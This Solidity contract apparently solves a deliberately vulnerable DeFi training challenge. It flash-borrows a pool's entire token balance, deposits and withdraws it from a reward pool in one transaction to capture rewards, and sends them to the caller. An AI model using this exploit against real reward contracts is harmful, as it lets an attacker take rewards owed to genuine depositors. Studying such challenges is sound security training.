// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract TheRewarderAttacker {
    FlashLoanerPool public flashLoanerPool;
    TheRewarderPool public theRewarderPool;
    IERC20 public token;
    IERC20 public rewardToken;

    constructor(
        address flashLoanerPoolAddress,
        address theRewarderPoolAddress,
        address tokenAddress,
        address rewardTokenAddress
    ) {
        flashLoanerPool = FlashLoanerPool(flashLoanerPoolAddress);
        theRewarderPool = TheRewarderPool(theRewarderPoolAddress);
        token = IERC20(tokenAddress);
        rewardToken = IERC20(rewardTokenAddress);
    }

    function attack() external {
        flashLoanerPool.flashLoan(token.balanceOf(address(flashLoanerPool)));
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        token.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
        token.transfer(msg.sender, amount);
    }
}
